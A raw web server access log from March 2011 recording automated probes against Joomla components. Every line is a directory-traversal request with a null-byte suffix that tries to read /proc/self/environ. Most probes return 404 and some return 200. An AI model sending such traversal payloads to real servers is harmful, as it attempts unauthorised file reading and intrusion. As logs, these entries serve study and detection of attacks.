94.23.8.216 - - [21/Mar/2011:22:47:24 +0900] "GET //index.php?option=com_photobattle&view=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:22:47:25 +0900] "GET //index.php?option=com_shoutbox&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
74.54.184.50 - - [21/Mar/2011:22:48:02 +0900] "GET //index.php?option=com_photobattle&view=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
91.121.64.167 - - [21/Mar/2011:22:48:34 +0900] "GET //index.php?option=com_photobattle&view=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
67.201.34.226 - - [21/Mar/2011:22:48:39 +0900] "GET //index.php?option=com_photobattle&view=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
91.121.64.167 - - [21/Mar/2011:22:49:01 +0900] "GET //index.php?option=com_photobattle&view=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
83.170.96.243 - - [21/Mar/2011:22:49:05 +0900] "GET //index.php?option=com_photobattle&view=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
112.216.153.186 - - [21/Mar/2011:22:49:10 +0900] "GET /access_log.last//index2.php?option=com_sbsfile&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 233
74.54.184.50 - - [21/Mar/2011:22:49:11 +0900] "GET //index.php?option=com_photobattle&view=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
112.216.153.186 - - [21/Mar/2011:22:49:11 +0900] "GET //index2.php?option=com_sbsfile&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 217
94.23.8.216 - - [21/Mar/2011:22:49:13 +0900] "GET //index.php?option=com_photobattle&view=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
67.201.34.226 - - [21/Mar/2011:22:49:14 +0900] "GET //index.php?option=com_photobattle&view=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
94.23.8.216 - - [21/Mar/2011:22:49:56 +0900] "GET //index.php?option=com_photobattle&view=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
83.170.96.243 - - [21/Mar/2011:22:50:06 +0900] "GET //index.php?option=com_photobattle&view=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
91.121.64.167 - - [21/Mar/2011:22:50:07 +0900] "GET //index.php?option=com_photobattle&view=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
173.236.201.197 - - [21/Mar/2011:22:50:27 +0900] "GET //index.php?option=com_photobattle&view=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:22:50:49 +0900] "GET //index.php?option=com_joomlapicasa2&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
87.106.182.143 - - [21/Mar/2011:22:51:13 +0900] "GET /access_log.last/?option=com_ccnewsletter&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 222
87.106.182.143 - - [21/Mar/2011:22:51:13 +0900] "GET /?option=com_ccnewsletter&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 200 954
94.23.35.111 - - [21/Mar/2011:22:52:47 +0900] "GET //index.php?option=com_jprojectmanager&controller=../../../../../../../../../../../../..//proc/self/environ%00 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:22:56:17 +0900] "GET //index.php?option=com_joomlapicasa2&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:22:56:23 +0900] "GET //index.php?option=com_shoutbox&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.23.35.111 - - [21/Mar/2011:22:57:02 +0900] "GET /access_log.last//index.php?option=com_jprojectmanager&controller=../../../../../../../../../../../../..//proc/self/environ%00 HTTP/1.1" 404 232
94.23.35.111 - - [21/Mar/2011:22:57:03 +0900] "GET //index.php?option=com_jprojectmanager&controller=../../../../../../../../../../../../..//proc/self/environ%00 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:22:57:27 +0900] "GET //index.php?option=com_shoutbox&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
216.119.135.66 - - [21/Mar/2011:22:57:27 +0900] "GET //index2.php?option=com_google&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 217
216.119.135.66 - - [21/Mar/2011:22:57:31 +0900] "GET //index2.php?option=com_google&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 217
216.119.135.66 - - [21/Mar/2011:22:57:42 +0900] "GET //index2.php?option=com_google&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 217
67.225.160.74 - - [21/Mar/2011:23:01:01 +0900] "GET //index.php?option=com_jresearch&controller=..//..//..//..//..//..//..//..//..//..//..//..//..//..//..//..//proc/self/environ%0000 HTTP/1.1" 404 216
67.225.160.74 - - [21/Mar/2011:23:02:02 +0900] "GET //index.php?option=com_jresearch&controller=..//..//..//..//..//..//..//..//..//..//..//..//..//..//..//..//proc/self/environ%0000 HTTP/1.1" 404 216
218.146.252.33 - - [21/Mar/2011:23:02:20 +0900] "GET //index2.php?option=com_google&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 217
218.146.252.33 - - [21/Mar/2011:23:02:21 +0900] "GET //index2.php?option=com_google&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 217
76.97.16.122 - - [21/Mar/2011:23:02:40 +0900] "GET //index.php?option=com_shoutbox&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
77.79.81.228 - - [21/Mar/2011:23:02:57 +0900] "GET //index2.php?option=com_google&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 217
77.79.81.228 - - [21/Mar/2011:23:03:04 +0900] "GET //index2.php?option=com_google&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 217
63.247.140.162 - - [21/Mar/2011:23:03:15 +0900] "GET //index.php?option=com_photobattle&view=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:23:03:23 +0900] "GET //index.php?option=com_shoutbox&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:23:03:47 +0900] "GET //index.php?option=com_shoutbox&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
63.247.140.162 - - [21/Mar/2011:23:04:28 +0900] "GET //index.php?option=com_photobattle&view=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:23:06:32 +0900] "GET //index.php?option=com_shoutbox&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.145.87.150 - - [21/Mar/2011:23:08:21 +0900] "GET //index.php?option=com_smestorage&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:23:09:26 +0900] "GET //index.php?option=com_shoutbox&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
184.107.154.194 - - [21/Mar/2011:23:10:09 +0900] "GET /access_log.last//////index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 236
184.107.154.194 - - [21/Mar/2011:23:10:10 +0900] "GET //////index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 220
217.145.87.150 - - [21/Mar/2011:23:10:21 +0900] "GET //index.php?option=com_smestorage&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
67.222.8.218 - - [21/Mar/2011:23:10:21 +0900] "GET //index.php?option=com_smestorage&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:23:10:40 +0900] "GET //index.php?option=com_shoutbox&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
184.107.154.194 - - [21/Mar/2011:23:11:20 +0900] "GET //////index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 220
67.222.8.218 - - [21/Mar/2011:23:11:43 +0900] "GET //index.php?option=com_smestorage&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
202.158.143.8 - - [21/Mar/2011:23:12:02 +0900] "GET //index.php?option=com_smestorage&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:23:12:05 +0900] "GET //index.php?option=com_shoutbox&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
202.158.143.8 - - [21/Mar/2011:23:12:13 +0900] "GET //index.php?option=com_smestorage&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
202.158.143.8 - - [21/Mar/2011:23:12:22 +0900] "GET //index.php?option=com_smestorage&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
184.107.154.194 - - [21/Mar/2011:23:13:14 +0900] "GET /access_log.last//////index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 236
184.107.154.194 - - [21/Mar/2011:23:13:14 +0900] "GET /access_log.last//////index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 236
184.107.154.194 - - [21/Mar/2011:23:13:15 +0900] "GET //////index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 220
184.107.154.194 - - [21/Mar/2011:23:13:15 +0900] "GET //////index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 220
184.107.154.194 - - [21/Mar/2011:23:13:25 +0900] "GET /access_log.last//////index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 236
184.107.154.194 - - [21/Mar/2011:23:13:25 +0900] "GET /access_log.last//////index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 236
184.107.154.194 - - [21/Mar/2011:23:13:26 +0900] "GET //////index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 220
184.107.154.194 - - [21/Mar/2011:23:13:26 +0900] "GET //////index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 220
184.107.154.194 - - [21/Mar/2011:23:15:06 +0900] "GET //////index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 220
76.97.16.122 - - [21/Mar/2011:23:15:10 +0900] "GET //index.php?option=com_ganalytics&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:23:15:42 +0900] "GET //index.php?option=com_shoutbox&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:23:19:10 +0900] "GET //index.php?option=com_shoutbox&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
184.107.154.194 - - [21/Mar/2011:23:19:42 +0900] "GET //////index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 220
67.222.8.218 - - [21/Mar/2011:23:20:06 +0900] "GET /access_log.last//index.php?option=com_smestorage&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
67.222.8.218 - - [21/Mar/2011:23:20:07 +0900] "GET //index.php?option=com_smestorage&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
187.61.61.182 - - [21/Mar/2011:23:23:53 +0900] "GET /access_log.last//index.php?option=com_ganalytics&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
187.61.61.182 - - [21/Mar/2011:23:23:54 +0900] "GET //index.php?option=com_ganalytics&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
187.61.61.182 - - [21/Mar/2011:23:25:24 +0900] "GET //index.php?option=com_ganalytics&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
187.61.61.182 - - [21/Mar/2011:23:27:39 +0900] "GET //index.php?option=com_ganalytics&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
91.121.64.167 - - [21/Mar/2011:23:29:03 +0900] "GET //index.php?option=com_photobattle&view=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
91.121.64.167 - - [21/Mar/2011:23:29:13 +0900] "GET //index.php?option=com_photobattle&view=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
63.247.140.162 - - [21/Mar/2011:23:29:22 +0900] "GET //index.php?option=com_photobattle&view=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
91.121.64.167 - - [21/Mar/2011:23:29:27 +0900] "GET //index.php?option=com_photobattle&view=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
83.170.96.243 - - [21/Mar/2011:23:29:50 +0900] "GET //index.php?option=com_photobattle&view=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
67.201.34.226 - - [21/Mar/2011:23:30:04 +0900] "GET //index.php?option=com_photobattle&view=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
67.201.34.226 - - [21/Mar/2011:23:30:21 +0900] "GET //index.php?option=com_photobattle&view=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
80.38.87.254 - - [21/Mar/2011:23:31:58 +0900] "GET //index.php?option=com_ganalytics&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
98.100.212.162 - - [21/Mar/2011:23:32:07 +0900] "GET /?option=com_ckforms&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 200 954
173.236.201.197 - - [21/Mar/2011:23:32:10 +0900] "GET //index.php?option=com_photobattle&view=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
80.38.87.254 - - [21/Mar/2011:23:32:56 +0900] "GET /access_log.last//index.php?option=com_ganalytics&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
80.38.87.254 - - [21/Mar/2011:23:32:57 +0900] "GET //index.php?option=com_ganalytics&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
80.38.87.254 - - [21/Mar/2011:23:34:07 +0900] "GET /access_log.last//index.php?option=com_ganalytics&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
80.38.87.254 - - [21/Mar/2011:23:34:08 +0900] "GET //index.php?option=com_ganalytics&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
80.38.87.254 - - [21/Mar/2011:23:34:27 +0900] "GET /access_log.last//index.php?option=com_ganalytics&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
80.38.87.254 - - [21/Mar/2011:23:34:28 +0900] "GET //index.php?option=com_ganalytics&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
187.61.61.182 - - [21/Mar/2011:23:37:41 +0900] "GET /access_log.last//index.php?option=com_ganalytics&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
187.61.61.182 - - [21/Mar/2011:23:37:41 +0900] "GET //index.php?option=com_ganalytics&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
173.236.201.197 - - [21/Mar/2011:23:40:35 +0900] "GET /////?option=com_wgpicasa&controller=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 200 957
80.38.87.254 - - [21/Mar/2011:23:41:10 +0900] "GET /access_log.last//index.php?option=com_ganalytics&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
80.38.87.254 - - [21/Mar/2011:23:41:11 +0900] "GET //index.php?option=com_ganalytics&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
74.54.184.50 - - [21/Mar/2011:23:41:14 +0900] "GET /////?option=com_wgpicasa&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 200 957
74.54.184.50 - - [21/Mar/2011:23:41:38 +0900] "GET /////?option=com_wgpicasa&controller=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 200 957
63.247.140.162 - - [21/Mar/2011:23:41:46 +0900] "GET /////?option=com_wgpicasa&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 200 957
67.201.34.226 - - [21/Mar/2011:23:42:00 +0900] "GET /////?option=com_wgpicasa&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 200 957
63.247.140.162 - - [21/Mar/2011:23:42:02 +0900] "GET /////?option=com_wgpicasa&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 200 957
83.170.96.243 - - [21/Mar/2011:23:42:07 +0900] "GET /////?option=com_wgpicasa&controller=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 200 957
83.170.96.243 - - [21/Mar/2011:23:42:08 +0900] "GET /////?option=com_wgpicasa&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 200 957
173.236.201.197 - - [21/Mar/2011:23:42:35 +0900] "GET /////?option=com_wgpicasa&controller=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 200 957
94.23.8.216 - - [21/Mar/2011:23:42:48 +0900] "GET /////?option=com_wgpicasa&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 200 957
